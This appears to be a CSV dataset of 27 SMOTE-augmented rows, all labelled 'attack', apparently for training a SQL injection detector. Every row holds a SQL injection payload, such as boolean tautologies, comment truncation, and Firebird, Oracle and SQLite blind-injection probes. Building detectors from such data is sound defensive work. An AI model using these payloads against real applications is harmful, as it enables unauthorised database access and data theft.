id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,boolean,"-5959"" or 2477  =  1144",nearest_attack_euclidean,R000174,0.06895403294530539
SMOTE_000002,attack,boolean,-2820'   )    )    or 6679  =  8848--,nearest_attack_euclidean,R000187,0.4636642850609234
SMOTE_000003,attack,boolean,1'||  (  select 'zxla' from dual where 7634  =  7634 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ||',nearest_attack_euclidean,R000155,0.8150031036491815
SMOTE_000004,attack,boolean,-7187' or 4159  =  7465,nearest_attack_euclidean,R000049,0.0
SMOTE_000005,attack,boolean,-4494 or 5291  =  4452,nearest_attack_euclidean,R000129,0.045903634591494547
SMOTE_000006,attack,boolean,-9950' or 4425  =  1975,nearest_attack_euclidean,R000076,0.07510033744878662
SMOTE_000007,attack,boolean,"-7559"" or 8792  =  6905--",nearest_attack_euclidean,R000099,0.5137504339452567
SMOTE_000008,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000092,0.7998129414000033
SMOTE_000009,attack,boolean,or 1  =  1--,nearest_attack_euclidean,R000006,2.181360311584421
SMOTE_000010,attack,boolean,"-7553%"" or 3571  =  2886",nearest_attack_euclidean,R000138,0.894504662863345
SMOTE_000011,attack,boolean,or 'a'  =  'a,nearest_attack_euclidean,R000020,0.44606522324101266
SMOTE_000012,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000245,0.1425230301989061
SMOTE_000013,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'vfxg' like 'vfxg",nearest_attack_euclidean,R000115,0.17798309112533056
SMOTE_000014,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""gjtx"" like ""gjtx",nearest_attack_euclidean,R000089,0.07009697180093451
SMOTE_000015,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""ewsr"" like ""ewsr",nearest_attack_euclidean,R000132,0.4969100397403329
SMOTE_000016,attack,boolean,-5534 or 1983  =  5721#,nearest_attack_euclidean,R000081,0.036178704113360785
SMOTE_000017,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # kfza",nearest_attack_euclidean,R000198,1.0996200881899696
SMOTE_000018,attack,boolean,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',nearest_attack_euclidean,R000037,2.697593310289982
SMOTE_000019,attack,boolean,"-7306"" or 2081  =  6847",nearest_attack_euclidean,R000232,0.033773353937911636
SMOTE_000020,attack,boolean,1 and 5934  =  7745,nearest_attack_euclidean,R000079,0.8513222279745782
SMOTE_000021,attack,boolean,or 1  =  1--,nearest_attack_euclidean,R000006,0.45186623524155767
SMOTE_000022,attack,boolean,-8447 where 2850  =  2850 or 7147  =  3262,nearest_attack_euclidean,R000209,0.8452213177026052
SMOTE_000023,attack,boolean,1'+  (  select twyt where 3376  =  3376 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',nearest_attack_euclidean,R000048,0.5550010399315916
SMOTE_000024,attack,boolean,"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--",nearest_attack_euclidean,R000308,0.4179365745088136
SMOTE_000025,attack,boolean,1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,nearest_attack_euclidean,R000264,0.3701364781057384
SMOTE_000026,attack,boolean, or uname like '%,nearest_attack_euclidean,R000041,1.2378510554289077
SMOTE_000027,attack,boolean,"-8875""  )   where 8428  =  8428 or 1519  =  5756--",nearest_attack_euclidean,R000240,0.7112509939645834
